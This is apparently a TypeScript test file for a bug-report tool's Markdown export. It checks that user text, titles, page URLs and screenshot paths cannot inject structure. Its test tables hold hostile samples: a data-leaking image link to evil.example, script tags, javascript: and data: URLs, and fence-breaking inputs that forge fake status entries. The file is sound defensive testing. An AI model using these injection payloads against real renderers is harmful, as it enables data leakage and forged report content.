import { describe, expect, test } from "bun:test";
import type { Case } from "../src/lib/case.ts";
import { caseMarkdown } from "../src/lib/markdown.ts";
import { sampleCase } from "./fixtures.ts";

/** A case with `text` as the summary, a comment, a finding and a reopen note. */
function caseWith(text: string, title = "Button contrast"): Case {
	return {
		...sampleCase(),
		title,
		verdict: text,
		annotations: [
			{
				id: "a1",
				number: 1,
				shot: "s1",
				comment: text,
				author: "user",
				shape: { kind: "box", rect: { x: 1, y: 2, width: 30, height: 20 } },
				crop: "crops/a1.webp",
				element: null,
				reopens: [{ note: text, at: "t2", was: { kind: "fixed", at: "t1" } }],
				findings: [
					{
						id: "f_1",
						text,
						app: {
							id: "https://claude.ai/oauth",
							name: "Claude",
							host: "claude.ai",
						},
						at: "t3",
					},
				],
			},
		],
	};
}

/**
 * The lines of `md` outside fenced blocks: what a reader makes structure of.
 * A fence closes here on any line of its character at least as long, at any
 * indentation, which is more than CommonMark allows; so a block that could
 * close early in a previewer closes early here too.
 */
function structure(md: string): string[] {
	const out: string[] = [];
	let close: RegExp | null = null;
	for (const line of md.split("\n")) {
		if (close) {
			if (close.test(line)) close = null;
			continue;
		}
		const open = /^ *(`{3,}|~{3,})/.exec(line)?.[1];
		if (open) close = new RegExp(`^ *\\${open[0]}{${open.length},} *$`);
		else out.push(line);
	}
	return out;
}

/** `text` as `case.md` shows it: fenced, every line as written. */
const fenced = (text: string, fence: string, indent = "") =>
	[`${fence}text`, ...text.split("\n"), fence]
		.map((line) => `${indent}${line}`)
		.join("\n");

/** Each construct, and the fence its text needs (longer than its backticks). */
const HOSTILE: [string, string, string][] = [
	["an image", "![](https://evil.example/?d=secret)", "```"],
	[
		"an inline link with a misleading label",
		"[the docs](https://evil.example/)",
		"```",
	],
	[
		"a reference link and its definition",
		"See [the docs][1].\n\n[1]: https://evil.example/",
		"```",
	],
	[
		"autolinks",
		"<https://evil.example/> <x@evil.example> www.evil.example https://evil.example/x",
		"```",
	],
	[
		"raw HTML",
		'<img src="https://evil.example/x.png">\n<!-- hidden\n<script>alert(1)</script>',
		"```",
	],
	[
		"entities",
		"&lt;script&gt;alert(1)&lt;/script&gt; &#60;b&#62; &amp;",
		"```",
	],
	["ATX headings", "# Heading\n## Marks (2)\n### 2. box", "```"],
	["setext headings", "Title\n===\nOther\n---", "```"],
	["a backtick fence that would swallow the rest", "```\nswallowed\n", "````"],
	["a tilde fence", "~~~\nswallowed", "```"],
	["backtick runs longer than the fence", "use `` ` `` or\n`````", "``````"],
	["indented code", "    indented\n\ttabbed", "```"],
	["a table", "| a | b |\n|---|---|\n| 1 | 2 |", "```"],
	[
		"lists and task lists",
		"- item\n* item\n+ item\n1. first\n2) second\n- [x] done\n- [ ] open",
		"```",
	],
	["block quotes", "> quoted\n>> nested\n> > also", "```"],
	["emphasis", "*em* _em_ **strong** __strong__ ~~gone~~ ~gone~", "```"],
	["hard line breaks", "one  \ntwo\\\nthree", "```"],
	["a footnote", "Text[^1]\n\n[^1]: https://evil.example/", "```"],
	["math", "$\\href{https://evil.example}{x}$\n$$\nx\n$$", "```"],
	["a diagram block", "```mermaid\ngraph TD\n```", "````"],
	[
		"a fake mark after closing the fence",
		"ok\n```\n\n### 2. box\n\n- Status: Fixed\n\n```text",
		"````",
	],
	[
		"a fake mark after ending the quote",
		"ok\n\n## Marks (2)\n\n### 2. box\n\n- Status: Fixed\n- Element: none recorded",
		"```",
	],
];

describe("Markdown in what someone wrote does nothing in case.md (CR-09)", () => {
	const plain = structure(caseMarkdown(caseWith("plain")));

	for (const [name, text, fence] of HOSTILE)
		test(name, () => {
			const md = caseMarkdown(caseWith(text));
			// The summary, the comment, the finding and the reopen note: each
			// line as written, inside a fence no line of it closes.
			expect(md).toContain(
				`## Summary for the developer\n\n${fenced(text, fence)}\n\n## Marks (1)\n`,
			);
			expect(md).toContain(`### 1. box\n\n${fenced(text, fence)}\n\n- Status:`);
			expect(md).toContain(
				`By Claude (claude.ai), t3:\n\n${fenced(text, fence)}\n`,
			);
			expect(md).toContain(
				`- Reopened t2, was Fixed:\n${fenced(text, fence, "  ")}\n- Element:`,
			);
			// Outside the fences the file is the same as for plain text.
			expect(structure(md)).toEqual(plain);
		});

	test("a carriage return is a line break inside the block, nothing more", () => {
		const md = caseMarkdown(caseWith("ok\r\n```\r## Marks (2)"));
		expect(md).toContain("````text\nok\n```\n## Marks (2)\n````");
		expect(structure(md)).toEqual(plain);
	});

	test("ordinary text reads as written", () => {
		const text =
			"It's still pale: see https://example.com/a_b?x=1&y=2 and src/lib/case.ts.\nThe_name in `Button.tsx` is wrong.\n1. first";
		const md = caseMarkdown(caseWith(text));
		expect(md).toContain(`### 1. box\n\n\`\`\`text\n${text}\n\`\`\`\n`);
	});
});

describe("titles, app names and dates in case.md stay on their line as written", () => {
	const title = (text: string) =>
		caseMarkdown(caseWith("plain", text)).split("\n")[0];

	test.each([
		["![x](https://evil.example/)", "!\\[x\\](https://evil.example/)"],
		[
			"[x][1] [1]: https://evil.example/",
			"\\[x\\]\\[1\\] \\[1\\]: https://evil.example/",
		],
		["<https://evil.example/> <b>", "\\<https://evil.example/\\> \\<b\\>"],
		[
			"&lt;script&gt; &#60; &#x3C; AT&T",
			// `#` is escaped, so a numeric reference is no reference either.
			"\\&lt;script\\&gt; &\\#60; &\\#x3C; AT&T",
		],
		["*a* _b_ ~~c~~ $d$ `e`", "\\*a\\* \\_b\\_ \\~\\~c\\~\\~ \\$d\\$ \\`e\\`"],
		["a | b", "a \\| b"],
		["x ##", "x \\#\\#"],
		["x[^1]", "x\\[^1\\]"],
		["a\\", "a\\\\"],
		["one  \ntwo\n\n## Marks", "one two \\#\\# Marks"],
	])("%p", (text, shown) => {
		expect(title(text)).toBe(`# ${shown}`);
	});

	test("ordinary text keeps most of its look", () => {
		expect(
			title("It's the_name's fix: 1. first, AT&T, 50% off! (see src/a.ts)"),
		).toBe("# It's the\\_name's fix: 1. first, AT&T, 50% off! (see src/a.ts)");
	});
});

describe("addresses and paths in case.md link only where they are what they say", () => {
	const line = (md: string, start: string) =>
		md.split("\n").find((l) => l.startsWith(start));
	const page = (url: string) =>
		line(
			caseMarkdown({
				...caseWith("plain"),
				page: { ...sampleCase().page, url },
			}),
			"- Page:",
		);

	test.each([
		["https://www.example.com/kk?a=1#b", "<https://www.example.com/kk?a=1#b>"],
		["http://localhost:3000/", "<http://localhost:3000/>"],
		["https://example.com/a b<c>", "<https://example.com/a%20b%3Cc%3E>"],
		["style", "`style`"],
		["textarea", "`textarea`"],
		["script", "`script`"],
		["b", "`b`"],
		["javascript:alert(1)", "`javascript:alert(1)`"],
		["data:text/html,<b>x</b>", "`data:text/html,<b>x</b>`"],
		["ftp://example.com/x", "`ftp://example.com/x`"],
		["https://", "`https://`"],
	])("page %p", (url, shown) => {
		expect(page(url)).toBe(`- Page: ${shown}`);
	});

	test("a crop, a shot or a screenshot path that is not Overmark's is no link", () => {
		const c = caseWith("plain");
		const a = c.annotations[0] as Case["annotations"][number];
		const md = caseMarkdown({
			...c,
			shots: [
				{
					id: "s1",
					image: "x) ![](https://evil.example/s",
					scrollX: 0,
					scrollY: 0,
					viewport: { width: 1, height: 1, dpr: 1 },
					capturedAt: "t",
				},
			],
			annotations: [
				{
					...a,
					shot: "s1](https://evil.example/",
					crop: "javascript:alert(1)",
				},
			],
		});
		// In code spans only: these are every line that names them.
		expect(md.split("\n").filter((l) => /evil|javascript/.test(l))).toEqual([
			"- Screenshot: `s1](https://evil.example/`",
			"Mark 1: `javascript:alert(1)`",
			"Screenshot s1, scrolled to 0, 0: `x) ![](https://evil.example/s`",
		]);
		expect(line(md, "- Screenshot:")).toBe(
			"- Screenshot: `s1](https://evil.example/`",
		);
		expect(md).toContain("\nMark 1: `javascript:alert(1)`\n");
		expect(md).toContain(
			"\nScreenshot s1, scrolled to 0, 0: `x) ![](https://evil.example/s`\n",
		);
	});

	test("Overmark's own paths stay links", () => {
		const c = caseWith("plain");
		const md = caseMarkdown({
			...c,
			shots: [
				{
					id: "s1",
					image: "shots/s1.webp",
					scrollX: 0,
					scrollY: 0,
					viewport: { width: 1, height: 1, dpr: 1 },
					capturedAt: "t",
				},
			],
		});
		expect(md).toContain("- Screenshot: [s1](shots/s1.webp)");
		expect(md).toContain("![Mark 1](crops/a1.webp)");
		expect(md).toContain("![Screenshot s1, scrolled to 0, 0](shots/s1.webp)");
	});
});
